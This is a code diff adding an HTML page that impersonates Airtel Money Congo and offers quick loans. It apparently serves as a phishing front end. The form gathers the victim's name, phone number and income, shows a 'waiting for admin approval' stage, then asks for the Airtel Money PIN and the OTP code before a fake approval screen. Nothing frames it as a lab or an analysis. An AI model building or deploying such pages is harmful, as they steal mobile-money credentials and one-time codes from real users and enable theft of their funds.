@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Airtel Money Congo - Prêt Rapide & Portail</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header class="bank-header">
+    <div class="header-container">
+      <div class="logo-area">
+        <span class="bank-badge">AIRTEL</span>
+        <h1 class="bank-title">Airtel Money</h1>
+      </div>
+    </div>
+  </header>
+
+  <main class="main-content">
+    <!-- VIEW 1: LOAN CALCULATOR / HOME -->
+    <div id="view-calculator" class="card active-card">
+      <h2>Obtenez Votre Prêt Aujourd'hui</h2>
+      <p class="subtitle">Approbation rapide • Taux bas • Conditions souples</p>
+      
+      <div class="calc-box">
+        <div class="input-group">
+          <label>Montant du Prêt (CDF)</label>
+          <input type="text" id="calc-amount" value="CDF 2,500,000" readonly>
+          <input type="range" id="amount-range" min="100000" max="5000000" step="50000" value="2500000">
+          <div class="range-labels"><span>CDF 100,000</span><span>CDF 5,000,000</span></div>
+        </div>
+
+        <div class="input-group">
+          <label>Durée du Prêt (Mois)</label>
+          <input type="range" id="duration-range" min="3" max="24" value="12">
+          <span id="duration-val">12 Mois</span>
+        </div>
+
+        <div class="monthly-display">
+          <span>Paiement Mensuel</span>
+          <h3 id="monthly-payment">CDF 235,000</h3>
+        </div>
+      </div>
+
+      <button id="btn-start-app" class="primary-btn">DEMANDER MAINTENANT</button>
+
+      <div class="features-row">
+        <div class="feature-item">
+          ⚡ <strong>Rapide</strong>
+          <span>En 24 heures</span>
+        </div>
+        <div class="feature-item">
+          💰 <strong>Faible Taux</strong>
+          <span>À partir de 10%</span>
+        </div>
+        <div class="feature-item">
+          🔒 <strong>Sécurisé</strong>
+          <span>Protection Airtel</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 2: MULTI-STEP APPLICATION FORM -->
+    <div id="view-form" class="card hidden">
+      <div class="form-header">
+        <h2>Demande de Prêt</h2>
+        <span id="step-indicator">Étape 1 sur 3</span>
+      </div>
+      <div class="progress-bar-container">
+        <div id="progress-fill" style="width: 33%;"></div>
+      </div>
+
+      <!-- Step 1: Details -->
+      <div class="form-step active-step" data-step="1">
+        <div class="field">
+          <label>Type de Prêt</label>
+          <select id="loan-type">
+            <option value="" disabled selected>Choisissez le type de prêt (Ex: Prêt Commercial)</option>
+            <option value="Prêt Commercial">Prêt Commercial</option>
+            <option value="Prêt Rapide">Prêt Rapide</option>
+            <option value="Prêt d'Urgence">Prêt d'Urgence</option>
+          </select>
+        </div>
+        <div class="field">
+          <label>Montant du Prêt (CDF)</label>
+          <input type="number" id="form-amount" placeholder="Ex: 2500000" required>
+        </div>
+        <div class="field">
+          <label>Motif du Prêt</label>
+          <textarea id="loan-purpose" placeholder="Ex: Élargir mon commerce" rows="3" required></textarea>
+        </div>
+        <button type="button" class="primary-btn next-btn" disabled>ÉTAPE SUIVANTE</button>
+      </div>
+
+      <!-- Step 2: Personal Info & Airtel Number -->
+      <div class="form-step hidden" data-step="2">
+        <div class="row-fields">
+          <div class="field">
+            <label>Prénom</label>
+            <input type="text" id="first-name" placeholder="Ex: Jean" required>
+          </div>
+          <div class="field">
+            <label>Nom</label>
+            <input type="text" id="last-name" placeholder="Ex: Mukendi" required>
+          </div>
+        </div>
+        <div class="field">
+          <label>Numéro Airtel Money</label>
+          <input type="tel" id="user-contact" maxlength="9" pattern="[0-9]{9}" placeholder="Ex: 970123456" required>
+          <small class="hint">Entrez votre numéro Airtel Congo (97x, 99x).</small>
+        </div>
+        <div class="button-group">
+          <button type="button" class="secondary-btn prev-btn">RETOUR</button>
+          <button type="button" class="primary-btn next-btn" disabled>ÉTAPE SUIVANTE</button>
+        </div>
+      </div>
+
+      <!-- Step 3: Employment & Summary -->
+      <div class="form-step hidden" data-step="3">
+        <div class="field">
+          <label>Situation Professionnelle</label>
+          <select id="employment-status">
+            <option value="" disabled selected>Choisissez votre statut (Ex: Entrepreneur)</option>
+            <option value="Salarié">Salarié</option>
+            <option value="Indépendant">Indépendant</option>
+            <option value="Propriétaire d'Entreprise">Propriétaire d'Entreprise</option>
+          </select>
+        </div>
+        <div class="field">
+          <label>Revenu Annuel (CDF)</label>
+          <input type="number" id="annual-income" placeholder="Ex: 12000000" required>
+        </div>
+
+        <div class="summary-box">
+          <h3>Résumé de la Demande</h3>
+          <p><strong>Montant :</strong> <span id="sum-amount">-</span></p>
+          <p><strong>Durée :</strong> <span id="sum-duration">-</span></p>
+          <p><strong>Motif :</strong> <span id="sum-purpose">-</span></p>
+          <p><strong>Demandeur :</strong> <span id="sum-name">-</span></p>
+        </div>
+
+        <div class="button-group">
+          <button type="button" class="secondary-btn prev-btn">RETOUR</button>
+          <button type="button" id="btn-submit-app" class="primary-btn" disabled>SOUMETTRE LA DEMANDE</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 3: WAITING FOR ADMIN APPROVAL -->
+    <div id="view-waiting" class="card hidden center-card">
+      <div class="spinner"></div>
+      <h2>Demande Soumise</h2>
+      <p>Votre demande a été envoyée. Veuillez patienter pour validation.</p>
+      <div class="status-box">
+        <span id="waiting-status-text">En attente de l'examen par le gestionnaire...</span>
+      </div>
+    </div>
+
+    <!-- VIEW 4: PIN & LOGIN ENTRY -->
+    <div id="view-login" class="card hidden">
+      <div class="login-header">
+        <span class="bank-badge sm">AIRTEL</span>
+        <h2>Entrez le Numéro Airtel</h2>
+        <p>Entrez votre numéro et votre code PIN pour continuer</p>
+      </div>
+      <div class="field">
+        <label>Numéro Airtel Money</label>
+        <input type="tel" id="login-contact" maxlength="9" pattern="[0-9]{9}" placeholder="Ex: 970123456" required>
+      </div>
+      <div class="field">
+        <label>Entrez le PIN Airtel (4 Chiffres)</label>
+        <div class="pin-inputs">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        </div>
+        <span id="pin-error" class="error-text hidden">PIN incorrect. Veuillez réessayer.</span>
+      </div>
+      <button id="btn-login" class="primary-btn" disabled>SE CONNECTER</button>
+    </div>
+
+    <!-- VIEW 5: OTP VERIFICATION -->
+    <div id="view-otp" class="card hidden">
+      <h2>Vérification OTP</h2>
+      <p>Entrez le code OTP à 4 chiffres envoyé à <span id="otp-target-display"></span></p>
+      <div class="field">
+        <div class="otp-inputs">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+        </div>
+        <span id="otp-error" class="error-text hidden">OTP incorrect. Veuillez réessayer.</span>
+      </div>
+      <button id="btn-submit-otp" class="primary-btn" disabled>SOUMETTRE L'OTP</button>
+    </div>
+
+    <!-- VIEW 6: SUCCESS -->
+    <div id="view-success" class="card hidden center-card">
+      <div class="success-icon">✓</div>
+      <h2>Félicitations !</h2>
+      <p>Votre prêt a été approuvé ! Les fonds seront bientôt transférés sur votre compte.</p>
+      <div class="approved-amount-box">
+        <span>MONTANT APPROUVÉ</span>
+        <h3 id="approved-amount-val">CDF 2,500,000</h3>
+      </div>
+      <button id="btn-home" class="primary-btn">ACCUEIL</button>
+    </div>
+  </main>
+
+  <footer class="bank-footer">
+    <p>&copy; 2026 Airtel Money Congo. Tous droits réservés.</p>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+  </html>
+                                                                                                 
